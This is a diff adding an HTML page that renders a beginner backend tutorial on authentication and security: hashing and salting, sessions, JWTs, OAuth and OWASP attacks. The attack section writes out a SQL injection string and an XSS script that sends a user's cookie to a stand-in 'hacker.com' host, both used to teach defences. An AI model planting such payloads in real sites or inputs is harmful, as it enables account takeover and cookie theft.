@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>03 - Authentication and Security (Masterclass)</title>
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <script type="module">
+        import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+        mermaid.initialize({ startOnLoad: false, theme: 'default' });
+        
+        document.addEventListener('DOMContentLoaded', async () => {
+            const content = document.getElementById('markdown-content').textContent;
+            document.getElementById('content').innerHTML = marked.parse(content);
+            
+            const mermaidBlocks = document.querySelectorAll('code.language-mermaid');
+            mermaidBlocks.forEach(block => {
+                const pre = block.parentElement;
+                const div = document.createElement('div');
+                div.className = 'mermaid';
+                div.textContent = block.textContent;
+                pre.replaceWith(div);
+            });
+            
+            await mermaid.run();
+        });
+    </script>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; max-width: 1000px; margin: 0 auto; padding: 40px 20px; line-height: 1.7; color: #2c3e50; }
+        pre { background: #f8f9fa; padding: 20px; border-radius: 8px; overflow-x: auto; border: 1px solid #e9ecef; }
+        code { font-family: 'Fira Code', Consolas, Monaco, monospace; background: #f8f9fa; padding: 3px 6px; border-radius: 4px; font-size: 0.9em; color: #e83e8c; }
+        blockquote { border-left: 5px solid #e74c3c; margin: 0; padding-left: 20px; background: #f8f9fa; padding-top: 10px; padding-bottom: 10px; border-radius: 0 8px 8px 0; }
+        .mermaid { margin: 40px 0; display: flex; justify-content: center; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
+        strong { color: #2c3e50; }
+        table { width: 100%; border-collapse: collapse; margin: 20px 0; font-size: 0.95em; }
+        th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
+        th { background-color: #f4f6f7; color: #2c3e50; font-weight: bold; }
+        .nav-bar { display: flex; justify-content: space-between; align-items: center; margin: 30px 0; padding: 15px 20px; background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 8px; }
+        .nav-btn { background-color: #34495e; color: white !important; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold; transition: background 0.3s; display: inline-block; border-bottom: 3px solid #3498db; }
+        .nav-btn:hover { background-color: #2980b9; }
+        .nav-btn.disabled { background-color: #ccc; cursor: not-allowed; pointer-events: none; border-bottom: 3px solid #aaa; }
+
+        /* Standardized Heading Styles (No H1 or H2, matching Validation Masterclass) */
+        h3 { color: #2c3e50; font-size: 1.8em; border-bottom: 2px solid #34495e; padding-bottom: 8px; margin-top: 0; }
+        h4 { color: #c0392b; font-size: 1.4em; margin-top: 40px; border-bottom: 1px solid #eee; padding-bottom: 6px; }
+        h5 { color: #e74c3c; font-size: 1.1em; margin-top: 20px; }
+        h6 { color: #e74c3c; font-size: 1.0em; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="nav-bar">
+        <a href="02b_SQL_Interview_Practice.html" class="nav-btn">&larr; Previous: SQL Interview Practice</a>
+        <a href="../index.html" class="nav-btn" style="background-color: #6c757d; border-bottom: 3px solid #495057;">🏠 Hub Index</a>
+        <a href="03a_Authentication_and_Authorization.html" class="nav-btn">Next: Auth Deep Dive &rarr;</a>
+    </div>
+    <div id="content"></div>
+    <div class="nav-bar">
+        <a href="02b_SQL_Interview_Practice.html" class="nav-btn">&larr; Previous: SQL Interview Practice</a>
+        <a href="../index.html" class="nav-btn" style="background-color: #6c757d; border-bottom: 3px solid #495057;">🏠 Hub Index</a>
+        <a href="03a_Authentication_and_Authorization.html" class="nav-btn">Next: Auth Deep Dive &rarr;</a>
+    </div>
+    <script type="text/markdown" id="markdown-content">
+### Backend Foundation 3: Authentication & Security (Masterclass)
+
+As a backend engineer, the responsibility of protecting user data falls entirely on your shoulders. A single mistake here can result in millions of leaked passwords and the end of a company. 
+
+This masterclass covers everything from beginner login concepts to advanced cryptographic principles and stopping hackers.
+
+---
+
+#### 1. The Core Difference: Authentication vs. Authorization
+
+These two words sound similar but mean completely different things. They are often abbreviated as **AuthN** and **AuthZ**.
+
+* **Authentication (AuthN):** *Who are you?* 
+  * (e.g., You provide an email and password to prove you are John Doe).
+* **Authorization (AuthZ):** *What are you allowed to do?* 
+  * (e.g., John Doe is logged in, but is he allowed to click the "Delete Website" button? No, only Admins are authorized).
+
+---
+
+#### 2. Passwords and Cryptography
+
+> [!WARNING]
+> **The Golden Rule:** NEVER store passwords in plain text (`"mypassword123"`). If your database is ever hacked, the hackers instantly have every user's password. 
+
+##### Encryption vs. Hashing
+* **Encryption** is a two-way street. You lock data with a key, and later, you use that same key to unlock it and read it.
+* **Hashing** is a one-way street. You put data through a mathematical meat-grinder. It creates a chaotic string of characters (a hash). It is mathematically impossible to reverse the hash back into the original password.
+
+**How Login Works with Hashes:**
+When a user signs up, you hash their password and save the hash to the database. When they try to log in, you hash the password they typed in, and check if the *new* hash matches the *saved* hash!
+
+##### The Problem: Rainbow Tables
+Hackers know that the word "password" always hashes to `5baa61e4`. So they created "Rainbow Tables" (massive dictionaries of billions of pre-computed hashes). If they steal your database, they just look up the hashes in their dictionary to find the passwords.
+
+##### The Solution: Salting & bcrypt
+To defeat Rainbow Tables, we use **Salting**. 
+Before hashing the password, the backend generates a random string of characters (the Salt) and attaches it to the password. 
+
+`Hash("password" + "random_salt_X7b9") = 8f72a4...`
+
+Now, even if two users have the exact same password, their hashes will look completely different! 
+
+**Industry Standard Tools:** In Node.js, you should always use a library like `bcrypt` or `Argon2`. They handle the complex salting and hashing automatically.
+
+---
+
+#### 3. Session-Based Authentication (Stateful)
+
+Because HTTP is stateless (remember File #1?), the backend forgets who you are the second after you log in. To fix this, we invented **Sessions and Cookies**.
+
+##### The Flow:
+1. User sends Email + Password.
+2. Backend verifies it.
+3. Backend creates a unique `Session ID` (e.g., `xyz_123`) and saves it in a Database table called `Sessions` (along with the User's ID).
+4. Backend sends the `Session ID` to the user's browser, hiding it inside a **Cookie**.
+5. On every future request, the browser automatically sends the Cookie. The backend looks up the `Session ID` in the database to see who the user is.
+
+```mermaid
+sequenceDiagram
+    participant B as Browser
+    participant S as Server
+    participant DB as Database
+
+    B->>S: POST /login (email, pass)
+    S->>DB: Verify User
+    S->>DB: Save Session (xyz_123 = User 1)
+    S-->>B: Response + Set-Cookie: xyz_123
+    
+    Note over B, S: 10 minutes later...
+    
+    B->>S: GET /profile (Cookie: xyz_123)
+    S->>DB: Who is Session xyz_123?
+    DB-->>S: It is User 1
+    S-->>B: Here is User 1's Profile
+```
+
+* **Pros:** Extremely secure. You can easily click "Log out from all devices," and the backend just deletes the session from the database.
+* **Cons:** Hard to scale. If you have 100 backend servers, they all need to constantly query the database just to check if a user is logged in.
+
+---
+
+#### 4. Token-Based Authentication (Stateless - JWT)
+
+To solve the scaling problem of Sessions, the industry created **JSON Web Tokens (JWT)**.
+
+A JWT is a cryptographic ticket given to the user. 
+Instead of saving the session in a database, the backend packs the user's ID directly *into* the JWT, signs it with an unbreakable digital signature, and hands it to the user.
+
+##### Anatomy of a JWT
+A JWT is a string divided into three parts by dots: `Header.Payload.Signature`
+1. **Header:** Says what kind of token it is.
+2. **Payload:** A JSON object containing the user data (e.g., `{"userId": 5, "role": "admin"}`). **Note: Anyone can read this! Do not put passwords here.**
+3. **Signature:** A cryptographic seal created using a `SECRET_KEY` that only the backend server knows.
+
+##### The Flow:
+When the user sends the JWT back in an API request, the backend does *not* need to check the database. It just uses its `SECRET_KEY` to verify the mathematical signature. If the signature is valid, the backend trusts the Payload.
+
+* **Pros:** Infinitely scalable. 10,000 requests per second? No problem, no database lookups required!
+* **Cons:** You cannot easily "Revoke" or cancel a JWT. Once you hand a JWT to a user, it is valid until it expires, even if you delete that user from your database!
+
+##### The Modern Standard: Access + Refresh Tokens
+Because you can't revoke a JWT, you should never make them last forever.
+1. **Access Token:** A JWT that lives for only 15 minutes. The user uses this for API calls.
+2. **Refresh Token:** A secure, random string that lives for 30 days and is saved in your database. When the Access Token expires, the frontend sends the Refresh Token to get a new Access Token. 
+
+If a hacker steals an Access Token, they only have 15 minutes. If a user is banned, you delete their Refresh Token from the database, and they are kicked out after 15 minutes.
+
+---
+
+#### 5. Single Sign-On (SSO) & OAuth 2.0
+
+"Login with Google" or "Login with GitHub" uses a protocol called **OAuth 2.0**.
+It allows a user to grant a third-party application (your website) access to their data without ever giving you their password.
+
+##### The OAuth Flow (Simplified)
+1. User clicks "Login with Google".
+2. Your backend redirects the user to `google.com/auth`.
+3. Google asks the user, "Do you want to let this app see your email address?"
+4. The user clicks "Yes".
+5. Google redirects the user *back* to your backend, and hands your backend an **Authorization Code**.
+6. Your backend securely contacts Google server-to-server and trades the Code for an **Access Token**.
+7. Your backend uses the Access Token to ask Google for the user's email address, and creates an account for them in your database.
+
+---
+
+#### 6. The OWASP Top Web Vulnerabilities (How Hackers Attack)
+
+As a backend engineer, you must memorize these attack vectors.
+
+##### 1. SQL Injection (SQLi)
+* **The Attack:** A hacker types `' OR 1=1 --` into the email login box. If you blindly paste their text into your SQL query, the query becomes `SELECT * FROM users WHERE email = '' OR 1=1`. Since `1=1` is always true, the database logs them into the first account it finds (usually the Admin).
+* **The Fix:** **Parameterized Queries**. Never use string concatenation (`"SELECT * WHERE email = " + userInput`). Use an ORM (Prisma) or a database driver that prepares the statement, completely neutralizing malicious characters.
+
+##### 2. Cross-Site Scripting (XSS)
+* **The Attack:** A hacker leaves a comment on your blog containing JavaScript: `<script>fetch('hacker.com?cookie=' + document.cookie)</script>`. When an innocent user reads the comment, their browser executes the invisible script and sends their login cookie directly to the hacker!
+* **The Fix:** Never render raw HTML from users. Always "sanitize" or escape user input before displaying it. (Modern frameworks like React do this automatically). 
+
+### 3. Cross-Site Request Forgery (CSRF)
+* **The Attack:** A hacker builds a fake website. Inside that website, there is an invisible form pointing to `yourbank.com/transfer?amount=1000`. If you are currently logged into your bank on another tab, the bank's cookie is sent automatically by the browser, and the transfer happens!
+* **The Fix:** Use CSRF Tokens (a unique hidden string in your forms) or set your login Cookies to `SameSite=Strict` so the browser refuses to send them if the request comes from a different domain.
+
+### 4. CORS (Cross-Origin Resource Sharing)
+* **What is it?** Not an attack, but a defense mechanism built into browsers. By default, a browser will block a website running on `http://localhost:3000` from making API calls to a backend running on `http://localhost:8080`.
+* **The Fix:** You must configure your Node.js backend to explicitly send headers saying, "I allow `localhost:3000` to talk to me!" (In Express, this is just `app.use(cors())`).
+
+> [!IMPORTANT]
+> **Where to Store JWTs in the Browser?**
+> Never store JWTs in `localStorage`! Any XSS attack can easily read `localStorage`. You should store JWT Access Tokens in **`HttpOnly` Cookies**. An `HttpOnly` cookie is locked inside the browser and is physically impossible for JavaScript (and therefore XSS hackers) to read.
+    </script>
+</body>
+</html>
